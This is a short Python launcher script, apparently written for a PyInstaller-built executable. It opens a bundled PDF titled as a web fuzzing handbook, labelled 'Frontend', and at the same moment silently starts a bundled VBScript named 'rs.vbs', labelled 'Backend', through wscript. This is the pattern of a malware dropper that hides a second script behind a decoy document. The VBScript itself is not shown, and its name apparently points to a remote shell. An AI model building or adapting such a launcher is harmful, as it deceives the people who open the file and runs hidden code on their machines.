import subprocess
import os
import sys

def resource_path(relative_path):
    """ Get absolute path to resource, works for dev and for PyInstaller """
    base_path = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))
    return os.path.join(base_path, relative_path)

# Path to your files inside the EXE
pdf_path = resource_path("Web_Fuzzing_Mastery_Handbook.pdf")
vbs_path = resource_path("rs.vbs")

# Launch Frontend (PDF)
os.startfile(pdf_path)

# Launch Backend (VBS)
subprocess.Popen(["wscript.exe", vbs_path], shell=True)
